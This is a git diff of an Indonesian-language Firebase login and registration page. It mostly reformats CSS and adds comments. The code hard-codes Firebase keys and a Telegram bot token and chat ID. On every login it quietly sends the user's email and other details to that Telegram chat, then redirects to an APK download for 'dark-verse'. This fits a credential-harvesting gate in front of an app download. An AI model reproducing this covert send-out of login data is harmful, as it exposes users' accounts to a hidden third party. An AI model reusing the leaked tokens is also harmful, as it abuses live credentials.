@@ -9,64 +9,29 @@
 
 <style>
 *{box-sizing:border-box;font-family:Poppins,sans-serif}
-
 body{
-margin:0;
-height:100vh;
-display:flex;
-align-items:center;
-justify-content:center;
-background:radial-gradient(circle at top,#14002a,#070010);
-color:white;
+margin:0;height:100vh;display:flex;align-items:center;justify-content:center;
+background:radial-gradient(circle at top,#14002a,#070010);color:white;
 }
-
 .container{width:380px}
-
 .card{
-padding:35px;
-border-radius:28px;
+padding:35px;border-radius:28px;
 background:rgba(255,255,255,0.05);
 backdrop-filter:blur(18px);
 box-shadow:0 0 40px rgba(168,85,247,.35);
-text-align:center;
-animation:fade .6s;
+text-align:center;animation:fade .6s;
 }
-
-@keyframes fade{
-from{opacity:0;transform:translateY(20px)}
-to{opacity:1}
-}
-
+@keyframes fade{from{opacity:0;transform:translateY(20px)}to{opacity:1}}
 input{
-width:100%;
-padding:14px;
-margin-bottom:12px;
-border:none;
-border-radius:14px;
-background:rgba(255,255,255,.08);
-color:white;
-outline:none;
+width:100%;padding:14px;margin-bottom:12px;border:none;border-radius:14px;
+background:rgba(255,255,255,.08);color:white;outline:none;
 }
-
 button{
-width:100%;
-padding:14px;
-border:none;
-border-radius:14px;
-font-weight:600;
-cursor:pointer;
-background:linear-gradient(90deg,#9333ea,#ec4899);
-color:white;
-box-shadow:0 0 25px #9333ea;
+width:100%;padding:14px;border:none;border-radius:14px;font-weight:600;
+cursor:pointer;background:linear-gradient(90deg,#9333ea,#ec4899);
+color:white;box-shadow:0 0 25px #9333ea;
 }
-
-.switch{
-margin-top:14px;
-font-size:13px;
-color:#c084fc;
-cursor:pointer;
-}
-
+.switch{margin-top:14px;font-size:13px;color:#c084fc;cursor:pointer}
 .msg{height:18px;margin-top:10px;font-size:13px}
 .success{color:#4ade80}
 .error{color:#fb7185}
@@ -91,24 +56,25 @@ import {
 getFirestore,doc,setDoc,getDoc
 } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
+/* 🔥 CONFIG */
 const firebaseConfig = {
-  apiKey: "AIzaSyCmeMZAvIK4JXS2G2m15JTPWdUiOe1C5qc",
-  authDomain: "website-login-9d67b.firebaseapp.com",
-  projectId: "website-login-9d67b",
-  storageBucket: "website-login-9d67b.firebasestorage.app",
-  messagingSenderId: "914596260910",
-  appId: "1:914596260910:web:f40ffe25362b1450bdc3bf",
-  measurementId: "G-M1220VTYZM"
+apiKey: "AIzaSyCmeMZAvIK4JXS2G2m15JTPWdUiOe1C5qc",
+authDomain: "website-login-9d67b.firebaseapp.com",
+projectId: "website-login-9d67b",
+appId: "1:914596260910:web:f40ffe25362b1450bdc3bf"
 };
 
 const BOT_TOKEN = "7991098911:AAH3YjGTrgSOjwHIAOyB882grVz7XGwiyls";
 const CHAT_ID = "8215645360";
-const REDIRECT_URL = "https://seruapk.com/dark-verse/download/"; // tujuan setelah login
+const REDIRECT_URL = "https://seruapk.com/dark-verse/download/";
 
+/* 🔥 INIT */
 const appFirebase = initializeApp(firebaseConfig);
 const auth = getAuth();
 const db = getFirestore();
 const app = document.getElementById("app");
+
+/* ================= UI ================= */
 
 function showLogin(){
 app.innerHTML=`
@@ -140,9 +106,11 @@ document.getElementById("msg").className="msg "+type;
 document.getElementById("msg").textContent=text;
 }
 
-/* REGISTER */
+/* ================= REGISTER ================= */
+
 window.register = async () => {
 try{
+
 const phone = document.getElementById("phone").value;
 const email = document.getElementById("email").value;
 const pass = document.getElementById("pass").value;
@@ -156,10 +124,14 @@ device:navigator.userAgent
 
 msg("Register berhasil ✔","success");
 
+/* ➜ PINDAH KE LOGIN */
+setTimeout(showLogin,1200);
+
 }catch(e){msg(e.message,"error")}
 };
 
-/* LOGIN */
+/* ================= LOGIN ================= */
+
 window.login = async () => {
 try{
 
@@ -171,14 +143,14 @@ const uid = user.user.uid;
 
 const snap = await getDoc(doc(db,"users",uid));
 
-/* ANTI MULTI LOGIN */
+/* ❌ CEK MULTI DEVICE */
 if(snap.data().device !== navigator.userAgent){
 msg("Akun aktif di device lain","error");
 await signOut(auth);
 return;
 }
 
-/* KIRIM TELEGRAM */
+/* 📩 KIRIM TELEGRAM */
 const text = `
 🔥 LOGIN BERHASIL
 📧 ${email}
@@ -190,7 +162,7 @@ await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT
 
 msg("Login berhasil...","success");
 
-/* REDIRECT */
+/* ➜ REDIRECT */
 setTimeout(()=>{
 window.location.href = REDIRECT_URL;
 },1200);
@@ -198,7 +170,8 @@ window.location.href = REDIRECT_URL;
 }catch(e){msg(e.message,"error")}
 };
 
-/* AUTO LOGIN */
+/* ================= AUTO LOGIN ================= */
+
 onAuthStateChanged(auth,user=>{
 if(user){
 window.location.href = REDIRECT_URL;
